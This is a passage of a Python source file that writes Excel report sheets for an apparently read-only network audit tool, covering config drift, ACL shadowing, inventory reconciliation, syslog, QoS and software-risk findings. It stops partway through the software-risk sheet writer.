                    ws.cell(r, 9).fill = PatternFill("solid", fgColor="EFEFEF")
                r += 1
    for i, w in enumerate([5, 12, 22, 9, 18, 8, 12, 34, 52, 32], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{NRFU_COMMANDS_SHEET_NAME}' sheet: {s.get('n_cases', 0)} case(s), "
                f"{s.get('n_waves', 0)} wave(s)")


GOLDEN_DRIFT_SHEET_NAME = "Golden-Config Drift"   # NEW-V3.23.146 (per-device config drift vs a baseline)

def write_golden_drift_sheet(wb, gd: dict) -> None:
    """Write 'Golden-Config Drift' from compute_golden_drift(): per-device compliance vs the baseline
    (a supplied golden-config file, else the auto-derived majority baseline) + the missing required
    directives. Row 1 states which baseline was used."""
    if GOLDEN_DRIFT_SHEET_NAME in wb.sheetnames:
        del wb[GOLDEN_DRIFT_SHEET_NAME]
    ws = _new_sheet(wb, GOLDEN_DRIFT_SHEET_NAME)
    p = gd or {}
    pdev = p.get("per_device") or []
    s = p.get("summary") or {}
    mode = s.get("mode", p.get("mode", "majority"))
    src = ("a supplied golden-config file" if mode == "golden-file"
           else "the fleet's de-facto MAJORITY baseline (auto-derived)")
    b = ws.cell(1, 1, f"Baseline: {src} — {s.get('n_baseline', 0)} required directive(s). "
                      "A device is flagged when it is MISSING one.")
    b.font = Font(bold=True, color="7030A0", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{s.get('n_devices', 0)} device(s) · {s.get('n_drifting', 0)} drifting · "
                  f"avg compliance {s.get('avg_compliance_pct', 0)}%").font = Font(size=10)
    hdr_row = 4
    cols = ["Device", "Compliance %", "Missing", "Missing required directives"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    DAT = Font(name="Calibri", size=10); MONO = Font(name="Consolas", size=9)
    r = hdr_row + 1
    for d in pdev:
        pct = d.get("compliance_pct", 0)
        fill = "C6EFCE" if pct >= 100 else ("FFEB9C" if pct >= 80 else "FFC7CE")
        vals = [d.get("host"), pct, d.get("n_missing", 0), "\n".join(d.get("missing") or [])]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = (MONO if col == 4 else DAT)
            c.alignment = Alignment(horizontal="center" if col in (2, 3) else "left",
                                    vertical="top", wrap_text=col == 4)
            if col == 2:
                c.fill = PatternFill("solid", fgColor=fill)
        r += 1
    if not pdev:
        ws.cell(hdr_row + 1, 1, "No running-configs available to compare.").font = DAT
    for i, w in enumerate([24, 14, 9, 80], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{GOLDEN_DRIFT_SHEET_NAME}' sheet: {len(pdev)} device(s), "
                f"{s.get('n_drifting', 0)} drifting ({mode})")


FEATURE_COMPLIANCE_SHEET_NAME = "Feature Compliance"   # roadmap I2 (Nautobot per-feature ConfigCompliance)

def write_feature_compliance_sheet(wb, fc: dict) -> None:
    """Write 'Feature Compliance' from compute_feature_compliance(): the golden-config drift decomposed per
    policy FEATURE (aaa / ntp / snmp / logging / ...), with how many devices drift in each. Coverage-honest:
    a feature with no baseline directives is simply absent (never a fabricated 'compliant')."""
    if FEATURE_COMPLIANCE_SHEET_NAME in wb.sheetnames:
        del wb[FEATURE_COMPLIANCE_SHEET_NAME]
    ws = _new_sheet(wb, FEATURE_COMPLIANCE_SHEET_NAME)
    p = fc or {}
    feats = p.get("features") or []
    s = p.get("summary") or {}
    b = ws.cell(1, 1, "Per-feature config compliance — the golden-config drift decomposed by policy area "
                      "(which features drift, across how many devices).")
    b.font = Font(bold=True, color="7030A0", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{s.get('n_features', 0)} feature(s) · {s.get('n_drift_rows', 0)} device-feature drift row(s)").font = Font(size=10)
    hdr_row = 4
    for i, h in enumerate(["Feature", "Baseline directives", "Devices drifting"], 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    DAT = Font(name="Calibri", size=10)
    r = hdr_row + 1
    for f in feats:
        nd = f.get("n_drifting", 0)
        fill = "C6EFCE" if nd == 0 else ("FFEB9C" if nd <= 2 else "FFC7CE")
        for col, v in enumerate([f.get("feature"), f.get("n_baseline", 0), nd], 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="left" if col == 1 else "center", vertical="top")
            if col == 3:
                c.fill = PatternFill("solid", fgColor=fill)
        r += 1
    if not feats:
        ws.cell(hdr_row + 1, 1, "No golden-config baseline to decompose.").font = DAT
    for i, w in enumerate([22, 18, 16], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{FEATURE_COMPLIANCE_SHEET_NAME}' sheet: {len(feats)} feature(s)")


ACL_SHADOW_SHEET_NAME = "ACL Shadow Analysis"   # roadmap G1 (Batfish-style filterLineReachability, offline)

def write_acl_shadow_sheet(wb, alr: dict) -> None:
    """Write 'ACL Shadow Analysis' from compute_filter_line_reachability(): each dead/shadowed ACL line with
    its typed reason, flagging a DIFFERENT-action shadow (a PERMIT silently hidden behind an earlier DENY —
    the dangerous case). Coverage-honest: INDETERMINATE (unevaluable) lines are listed, never called dead."""
    if ACL_SHADOW_SHEET_NAME in wb.sheetnames:
        del wb[ACL_SHADOW_SHEET_NAME]
    ws = _new_sheet(wb, ACL_SHADOW_SHEET_NAME)
    p = alr or {}
    rows = p.get("findings") or []
    s = p.get("summary") or {}
    b = ws.cell(1, 1, "Offline ACL line-reachability proof — lines that can never match (dead/shadowed), an "
                      "empty match-space, or a bad object-group reference. A different-action shadow is a "
                      "silently-broken intent.")
    b.font = Font(bold=True, color="7030A0", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{s.get('n_shadowed', 0)} shadowed · {s.get('n_different_action', 0)} different-action · "
                  f"{s.get('n_unmatchable', 0)} unmatchable · {s.get('n_bad_reference', 0)} bad-ref · "
                  f"{s.get('n_indeterminate', 0)} indeterminate").font = Font(size=10)
    hdr_row = 4
    for i, h in enumerate(["Device", "ACL", "Line #", "Action", "Reason", "Different action", "Detail", "Rule"], 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    DAT = Font(name="Calibri", size=10); MONO = Font(name="Consolas", size=9)
    r = hdr_row + 1
    for f in rows:
        diff = bool(f.get("different_action"))
        fill = "FFC7CE" if diff else ("FFEB9C" if f.get("reason") == "INDETERMINATE" else None)
        vals = [f.get("host"), f.get("acl"), (f.get("line_index", 0) + 1), f.get("action"),
                f.get("reason"), ("yes" if diff else "no"), f.get("detail"), f.get("raw")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = (MONO if col == 8 else DAT)
            c.alignment = Alignment(horizontal="center" if col in (3, 4, 6) else "left", vertical="top", wrap_text=col in (7, 8))
            if col == 6 and fill:
                c.fill = PatternFill("solid", fgColor=fill)
        r += 1
    if not rows:
        ws.cell(hdr_row + 1, 1, "No ACL findings (no shadowed/unmatchable lines, or no ACLs collected).").font = DAT
    for i, w in enumerate([22, 16, 7, 9, 22, 14, 40, 44], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{ACL_SHADOW_SHEET_NAME}' sheet: {len(rows)} finding(s)")


EXTERNAL_RECONCILE_SHEET_NAME = "SoT Reconcile"   # roadmap B (declared source-of-truth vs collected evidence)

def write_external_reconcile_sheet(wb, recon: dict) -> None:
    """Write 'SoT Reconcile' from reconcile_external(): each device that drifts between the DECLARED
    source-of-truth (a CMDB/NetBox export) and the collected evidence (MISSING / UNDOCUMENTED / MODEL_MISMATCH
    / IP_DRIFT), plus the coverage-honest UNVERIFIABLE (declared but never collected — a blind spot, never a
    confirmed match or miss). A fully-reconciling device emits no row."""
    if EXTERNAL_RECONCILE_SHEET_NAME in wb.sheetnames:
        del wb[EXTERNAL_RECONCILE_SHEET_NAME]
    ws = _new_sheet(wb, EXTERNAL_RECONCILE_SHEET_NAME)
    p = recon or {}
    rows = p.get("rows") or []
    s = p.get("summary") or {}
    b = ws.cell(1, 1, "Declared source-of-truth vs collected evidence. UNVERIFIABLE = declared but never "
                      "collected (a blind spot, never a confirmed match or miss).")
    b.font = Font(bold=True, color="7030A0", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{s.get('n_declared', 0)} declared · {s.get('n_observed', 0)} observed · "
                  f"{s.get('MISSING_DEVICE', 0)} missing · {s.get('UNDOCUMENTED_DEVICE', 0)} undocumented · "
                  f"{s.get('MODEL_MISMATCH', 0)} model · {s.get('IP_DRIFT', 0)} ip · "
                  f"{s.get('UNVERIFIABLE', 0)} unverifiable").font = Font(size=10)
    hdr_row = 4
    for i, h in enumerate(["Type", "Device", "Detail"], 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    DAT = Font(name="Calibri", size=10)
    _COLOR = {"MISSING_DEVICE": "FFC7CE", "MODEL_MISMATCH": "FFC7CE", "IP_DRIFT": "FFC7CE",
              "UNDOCUMENTED_DEVICE": "FFEB9C", "UNVERIFIABLE": "D9D9D9"}
    r = hdr_row + 1
    for row in rows:
        t = row.get("type")
        for col, v in enumerate([t, row.get("host"), row.get("detail")], 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="left", vertical="top", wrap_text=col == 3)
            if col == 1 and t in _COLOR:
                c.fill = PatternFill("solid", fgColor=_COLOR[t])
        r += 1
    if not rows:
        ws.cell(hdr_row + 1, 1, "Declared inventory fully reconciles with the collected evidence.").font = DAT
    for i, w in enumerate([22, 26, 70], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{EXTERNAL_RECONCILE_SHEET_NAME}' sheet: {len(rows)} drift row(s)")


CAPTURE_INTEGRITY_SHEET_NAME = "Capture Integrity"   # roadmap K1 (truncation / pager / CLI-error guard)

def write_capture_integrity_sheet(wb, ci: dict) -> None:
    """Write 'Capture Integrity' from compute_capture_integrity(): collected command output that looks
    truncated / paginated / errored, so a partial capture is a declared blind spot, never silently healthy.
    A clean capture emits no row."""
    if CAPTURE_INTEGRITY_SHEET_NAME in wb.sheetnames:
        del wb[CAPTURE_INTEGRITY_SHEET_NAME]
    ws = _new_sheet(wb, CAPTURE_INTEGRITY_SHEET_NAME)
    p = ci or {}
    rows = p.get("findings") or []
    s = p.get("summary") or {}
    b = ws.cell(1, 1, "Per-capture integrity — collected command output that looks truncated, paginated, or "
                      "errored. A partial capture is a blind spot, never silently 'healthy'.")
    b.font = Font(bold=True, color="7030A0", size=10); b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{s.get('n_hosts_affected', 0)} host(s) affected · {s.get('n_incomplete', 0)} incomplete · "
                  f"{s.get('n_error', 0)} error · {s.get('n_empty', 0)} empty · "
                  f"{s.get('n_unverified_prompt', 0)} unverified-prompt (timing-fallback capture — "
                  f"completeness unproven)").font = Font(size=10)
    hdr_row = 4
    for i, h in enumerate(["Device", "Command", "Status", "Reason"], 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="7030A0"); c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    DAT = Font(name="Calibri", size=10)
    _C = {"error": "FFC7CE", "incomplete": "FFEB9C", "empty": "D9D9D9",
          "unverified_prompt": "BDD7EE"}   # Tier-2 #6: ok-looking body, prompt never confirmed
    r = hdr_row + 1
    for f in rows:
        st = f.get("status")
        for col, v in enumerate([f.get("host"), f.get("command"), st, f.get("reason")], 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="left", vertical="top", wrap_text=col == 4)
            if col == 3 and st in _C:
                c.fill = PatternFill("solid", fgColor=_C[st])
        r += 1
    if not rows:
        ws.cell(hdr_row + 1, 1, "All collected captures look complete.").font = DAT
    for i, w in enumerate([22, 26, 12, 60], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{CAPTURE_INTEGRITY_SHEET_NAME}' sheet: {len(rows)} finding(s)")


ATTESTATION_SHEET_NAME = "Trust & Sovereignty"   # roadmap D3 (re-derived zero-egress attestation)

def write_attestation_sheet(wb, attestation: dict) -> None:
    """Write 'Trust & Sovereignty' from compute_attestation(): the read-only / no-egress /
    GET-only / no-LLM trust claims RE-DERIVED at build time from this installation's actual
    registries and sources — a falsifiable proof, never a hardcoded badge. A claim that could
    not be evaluated renders NOT_EVALUATED (grey), and a failed compute renders UNVERIFIED —
    absence of evidence is never rendered as a pass."""
    if ATTESTATION_SHEET_NAME in wb.sheetnames:
        del wb[ATTESTATION_SHEET_NAME]
    ws = _new_sheet(wb, ATTESTATION_SHEET_NAME)
    p = attestation if isinstance(attestation, dict) else {}
    # _sec_rows, not `or []`: a truthy non-list `claims` survived and the genexpr below then raised.
    # The attestation sheet asserting "zero egress" must never vanish silently -- that is the one
    # claim a reader trusts most (see _run_phase: a raising sheet writer drops the sheet, not the run).
    claims = _sec_rows(p.get("claims"))
    n_holds = sum(1 for c in claims if c.get("result") == "HOLDS")
    if claims:
        banner = ("Zero-egress attestation — each claim below was RE-DERIVED at build time from the "
                  "actual command registries and source tree (same mechanics as the CI doctrine guard), "
                  "not asserted. HOLDS is proven now; NOT_EVALUATED is a disclosed abstention.")
    else:   # the sentinel/empty case must not echo any result word the claims table could carry
        banner = ("Zero-egress attestation — the trust-claim re-derivation did not run for this "
                  "build, so no claim below is proven or refuted.")
    b = ws.cell(1, 1, banner)
    b.font = Font(bold=True, color="7030A0", size=10); b.alignment = Alignment(horizontal="left", wrap_text=True)
    if claims:
        ws.cell(2, 1, f"schema {p.get('schema', '—')} · generated {p.get('generated_at', '—')} · "
                      f"{n_holds}/{len(claims)} claim(s) hold").font = Font(size=10)
    hdr_row = 4
    for i, h in enumerate(["Claim", "Result", "Method (re-derived at build time)", "Evidence / detail"], 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="7030A0"); c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    DAT = Font(name="Calibri", size=10)
    _C = {"HOLDS": "D9EAD3", "VIOLATED": "FFC7CE", "NOT_EVALUATED": "D9D9D9"}
    r = hdr_row + 1
    for cl in claims:
        res = cl.get("result")
        for col, v in enumerate([cl.get("id"), res, cl.get("method"), cl.get("detail")], 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="left", vertical="top", wrap_text=col >= 3)
            if col == 2 and res in _C:
                c.fill = PatternFill("solid", fgColor=_C[res])
        r += 1
    if not claims:
        c = ws.cell(hdr_row + 1, 1, "Attestation could not be computed for this run — the trust claims are "
                                    "UNVERIFIED (a failed proof is disclosed, never assumed).")
        c.font = DAT; c.fill = PatternFill("solid", fgColor="FFC7CE")
    for i, w in enumerate([28, 16, 55, 65], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{ATTESTATION_SHEET_NAME}' sheet: {n_holds}/{len(claims)} claim(s) hold")


WHATIF_SHEET_NAME = "Failure What-If"   # roadmap G4 (single-snapshot failure-injection)

def write_whatif_sheet(wb, scenarios: list) -> None:
    """Write 'Failure What-If' from run_scenarios(): per injected node/site failure, how reachability changed —
    blocked (definitive) vs lost_path (was reached, now unprovable, coverage-honest) vs preserved."""
    if WHATIF_SHEET_NAME in wb.sheetnames:
        del wb[WHATIF_SHEET_NAME]
    ws = _new_sheet(wb, WHATIF_SHEET_NAME)
    rows = scenarios or []
    b = ws.cell(1, 1, "Failure-injection what-if — remove a node/site in memory and re-run the FIB. 'lost path' "
                      "= a flow that was reached and is now unprovable (never fabricated as a definite block).")
    b.font = Font(bold=True, color="7030A0", size=10); b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{len(rows)} scenario(s)").font = Font(size=10)
    hdr_row = 4
    for i, h in enumerate(["Scenario", "Removed", "Blocked", "Lost path", "Preserved", "Inconclusive"], 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="7030A0"); c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    DAT = Font(name="Calibri", size=10)
    r = hdr_row + 1
    for sc in rows:
        sm = sc.get("summary") or {}
        removed = ", ".join(sc.get("removed_hosts") or [])
        vals = [sc.get("name") or removed or "(no match)", removed, sm.get("blocked", 0),
                sm.get("lost_path", 0), sm.get("preserved", 0), sm.get("inconclusive_other", 0) + sm.get("other", 0)]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="left" if col in (1, 2) else "center", vertical="top", wrap_text=col == 2)
            if col == 3 and sm.get("blocked"):
                c.fill = PatternFill("solid", fgColor="FFC7CE")
            if col == 4 and sm.get("lost_path"):
                c.fill = PatternFill("solid", fgColor="FFEB9C")
        r += 1
    if not rows:
        ws.cell(hdr_row + 1, 1, "No scenarios supplied (use --scenario FILE).").font = DAT
    for i, w in enumerate([26, 26, 10, 11, 11, 13], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{WHATIF_SHEET_NAME}' sheet: {len(rows)} scenario(s)")


PATH_INTENTS_SHEET_NAME = "Path Assertions"   # roadmap G3 (named segmentation/path intents)

def write_path_intents_sheet(wb, pa: dict) -> None:
    """Write 'Path Assertions' from evaluate_path_assertions(): each named REACHES/ISOLATED intent and its
    verdict (pass / fail / not_observed). Coverage-honest: a lower-bound trace abstains, never a fake verdict."""
    if PATH_INTENTS_SHEET_NAME in wb.sheetnames:
        del wb[PATH_INTENTS_SHEET_NAME]
    ws = _new_sheet(wb, PATH_INTENTS_SHEET_NAME)
    p = pa or {}
    rows = p.get("results") or []
    s = p.get("summary") or {}
    b = ws.cell(1, 1, "Named path / segmentation intents evaluated over the computed FIB. ISOLATED can be "
                      "PROVEN only by a computed-unreachable trace; a lower bound abstains (not_observed).")
    b.font = Font(bold=True, color="7030A0", size=10); b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{s.get('pass', 0)} pass · {s.get('fail', 0)} fail · {s.get('not_observed', 0)} not observed").font = Font(size=10)
    hdr_row = 4
    for i, h in enumerate(["Intent", "Source", "Destination", "Expect", "Verdict", "Computed status"], 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="7030A0"); c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    DAT = Font(name="Calibri", size=10)
    _C = {"fail": "FFC7CE", "not_observed": "D9D9D9", "pass": "C6EFCE"}
    r = hdr_row + 1
    for row in rows:
        vd = row.get("verdict")
        vals = [row.get("id"), row.get("src"), row.get("dst"), row.get("expect"), vd, row.get("status")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="left", vertical="top")
            if col == 5 and vd in _C:
                c.fill = PatternFill("solid", fgColor=_C[vd])
        r += 1
    if not rows:
        ws.cell(hdr_row + 1, 1, "No path intents supplied (use --path-intents FILE).").font = DAT
    for i, w in enumerate([20, 18, 18, 12, 14, 28], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{PATH_INTENTS_SHEET_NAME}' sheet: {len(rows)} intent(s)")


# Shared severity palette for the V3.23.164-.167 axis sheets (V3.23.171). The four writers each
# carried a private copy whose High had drifted to F4CCCC -- the colour every ESTABLISHED writer
# (punch-list, remediation, validation, exec summary) reserves for Critical. One constant, and
# High renders FCE4D6 here exactly as it does everywhere else in the workbook.
_AXIS_SEV_FILL = {"Critical": "F4CCCC", "High": "FCE4D6", "Medium": "FFF2CC", "Low": "D9EAD3"}

SYSLOG_SHEET_NAME = "Syslog Intelligence"   # NEW-V3.23.164 (NOS-style operational log analysis)

def write_syslog_intelligence_sheet(wb, si: dict) -> None:
    """Write 'Syslog Intelligence' from compute_syslog_intelligence(): the operational
    detections (MAC flap / err-disable / link flap / environmental / ...) with the
    senior-engineer doctrine per finding, then the per-device log profile. Devices whose
    'show logging' was not collected are declared, never scored."""
    if SYSLOG_SHEET_NAME in wb.sheetnames:
        del wb[SYSLOG_SHEET_NAME]
    ws = _new_sheet(wb, SYSLOG_SHEET_NAME)
    p = si or {}
    dets = p.get("detections") or []
    pdev = p.get("per_device") or []
    s = p.get("summary") or {}
    b = ws.cell(1, 1, f"Operational log analysis: {s.get('total_events', 0)} event(s) parsed on "
                      f"{s.get('n_collected', 0)} of {s.get('n_devices', 0)} device(s) -> "
                      f"{s.get('n_detections', 0)} detection(s). The log buffer is a bounded recent "
                      "window, so counts are floors; absence of logs is never scored as absence of problems.")
    b.font = Font(bold=True, color="7030A0", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{s.get('crit_0_2', 0)} critical (sev 0-2) · {s.get('err_3', 0)} error (sev 3) · "
                  f"{s.get('n_not_collected', 0)} device(s) without 'show logging' output").font = Font(size=10)
    SEVFILL = _AXIS_SEV_FILL
    HDRF = Font(bold=True, color="FFFFFF", size=10)
    DAT = Font(name="Calibri", size=10); MONO = Font(name="Consolas", size=9)

    hdr_row = 4
    cols = ["Device", "Finding", "Severity", "Count", "Detail", "Evidence (first event)", "Recommendation"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    r = hdr_row + 1
    for d in dets:
        vals = [d.get("host"), d.get("label"), d.get("severity"), d.get("count", 0),
                d.get("detail"), d.get("example"), d.get("recommendation")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = (MONO if col == 6 else DAT)
            c.alignment = Alignment(horizontal="center" if col in (3, 4) else "left",
                                    vertical="top", wrap_text=col in (5, 6, 7))
            if col == 3 and v in SEVFILL:
                c.fill = PatternFill("solid", fgColor=SEVFILL[v])
        r += 1
    if not dets:
        ws.cell(r, 1, "No operational detections in the collected logs." if s.get("n_collected")
                else "No 'show logging' output collected -- log evidence unavailable.").font = DAT
        r += 1

    r += 2
    ws.cell(r, 1, "Per-device log profile").font = Font(bold=True, color="7030A0", size=10)
    r += 1
    cols2 = ["Device", "Collected", "Events", "Crit (0-2)", "Err (3)", "Warn (4)",
             "Info (5-7)", "Config changes", "Top messages"]
    for i, h in enumerate(cols2, 1):
        c = ws.cell(r, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    r += 1
    for d in pdev:
        bs = d.get("by_severity") or {}
        top = ", ".join(f"{m['msg']} ({m['count']}x)" for m in (d.get("top_messages") or []))
        vals = [d.get("host"), "yes" if d.get("collected") else "NOT COLLECTED",
                d.get("events", 0), bs.get("crit_0_2", 0), bs.get("err_3", 0),
                bs.get("warn_4", 0), bs.get("info_5_7", 0), d.get("config_changes", 0), top]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = (MONO if col == 9 else DAT)
            c.alignment = Alignment(horizontal="center" if col in (2, 3, 4, 5, 6, 7, 8) else "left",
                                    vertical="top", wrap_text=col == 9)
            if col == 2 and not d.get("collected"):
                c.fill = PatternFill("solid", fgColor="EFEFEF")
            if col == 4 and bs.get("crit_0_2", 0):
                c.fill = PatternFill("solid", fgColor="F4CCCC")
        r += 1
    # shared column widths: table 1 (A-G) needs wide Detail/Evidence/Recommendation;
    # table 2 (A-I) tolerates wide numeric columns.
    for i, w in enumerate([22, 24, 11, 9, 36, 42, 46, 13, 42], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{SYSLOG_SHEET_NAME}' sheet: {len(dets)} detection(s) on "
                f"{s.get('n_collected', 0)}/{s.get('n_devices', 0)} device(s) with logs")


QOS_AUDIT_SHEET_NAME = "QoS Audit"   # NEW-V3.23.165 (configured QoS posture + doctrine findings)

def write_qos_audit_sheet(wb, qa: dict) -> None:
    """Write 'QoS Audit' from compute_qos_audit(): the doctrine findings (voice edge
    without QoS, missing trust boundary, inert/dangling policy, fleet consistency),
    then the per-device configured posture. Devices without a full running-config
    capture are declared not assessable, never scored."""
    if QOS_AUDIT_SHEET_NAME in wb.sheetnames:
        del wb[QOS_AUDIT_SHEET_NAME]
    ws = _new_sheet(wb, QOS_AUDIT_SHEET_NAME)
    p = qa or {}
    finds = p.get("findings") or []
    pdev = p.get("per_device") or []
    s = p.get("summary") or {}
    modes = s.get("modes") or {}
    mode_txt = ", ".join(f"{k}: {v}" for k, v in modes.items()) or "none assessable"
    b = ws.cell(1, 1, f"Configured QoS posture from the captured running-configs of "
                      f"{s.get('n_assessable', 0)} of {s.get('n_devices', 0)} device(s) -> "
                      f"{s.get('n_findings', 0)} finding(s). Config evidence only (no live queue "
                      "counters); a device without a full capture is declared not assessable.")
    b.font = Font(bold=True, color="7030A0", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"Posture by mode — {mode_txt} · {s.get('n_voice_ports', 0)} voice-VLAN port(s) "
                  f"· {s.get('n_not_assessable', 0)} not assessable").font = Font(size=10)
    SEVFILL = _AXIS_SEV_FILL
    HDRF = Font(bold=True, color="FFFFFF", size=10)
    DAT = Font(name="Calibri", size=10)

    hdr_row = 4
    cols = ["Device", "Finding", "Severity", "Detail", "Recommendation"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    r = hdr_row + 1
    for f in finds:
        vals = [f.get("host"), f.get("label"), f.get("severity"), f.get("detail"),
                f.get("recommendation")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="center" if col == 3 else "left",
                                    vertical="top", wrap_text=col in (4, 5))
            if col == 3 and v in SEVFILL:
                c.fill = PatternFill("solid", fgColor=SEVFILL[v])
        r += 1
    if not finds:
        ws.cell(r, 1, "No QoS findings on the assessable devices." if s.get("n_assessable")
                else "No full running-config captures -- QoS posture not assessable.").font = DAT
        r += 1

    r += 2
    ws.cell(r, 1, "Per-device configured posture").font = Font(bold=True, color="7030A0", size=10)
    r += 1
    cols2 = ["Device", "Assessable", "Mode", "Class-maps", "Policy-maps", "Attached if",
             "Trust if", "Auto-QoS if", "Voice if", "Posture"]
    for i, h in enumerate(cols2, 1):
        c = ws.cell(r, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    r += 1
    for d in pdev:
        vals = [d.get("host"), "yes" if d.get("assessable") else "NOT ASSESSABLE",
                d.get("mode"), d.get("n_class_maps", 0), d.get("n_policy_maps", 0),
                d.get("n_attached_if", 0), d.get("n_trust_if", 0), d.get("n_auto_if", 0),
                d.get("n_voice_if", 0), d.get("posture")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="center" if col in (2, 4, 5, 6, 7, 8, 9) else "left",
                                    vertical="top", wrap_text=col == 10)
            if col == 2 and not d.get("assessable"):
                c.fill = PatternFill("solid", fgColor="EFEFEF")
        r += 1
    # shared widths: table 1 (A-E) needs wide Detail/Recommendation; table 2 spreads A-J.
    for i, w in enumerate([22, 30, 11, 48, 48, 12, 10, 12, 10, 46], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{QOS_AUDIT_SHEET_NAME}' sheet: {len(finds)} finding(s), "
                f"{s.get('n_assessable', 0)}/{s.get('n_devices', 0)} device(s) assessable")


SOFTWARE_RISK_SHEET_NAME = "Software Risk"   # NEW-V3.23.166 (advisory-surface screening + train lifecycle)

def write_software_risk_sheet(wb, sr: dict) -> None:
    """Write 'Software Risk' from compute_software_risk(): the attack-surface screening
    findings (each joined to its landmark advisory) and the per-device software-train
    lifecycle bands. Screening, not a vulnerability scan -- the banner says so."""
    if SOFTWARE_RISK_SHEET_NAME in wb.sheetnames:
        del wb[SOFTWARE_RISK_SHEET_NAME]
    ws = _new_sheet(wb, SOFTWARE_RISK_SHEET_NAME)
    p = sr or {}
    finds = p.get("findings") or []
    pdev = p.get("per_device") or []
    s = p.get("summary") or {}
    bands = s.get("train_bands") or {}
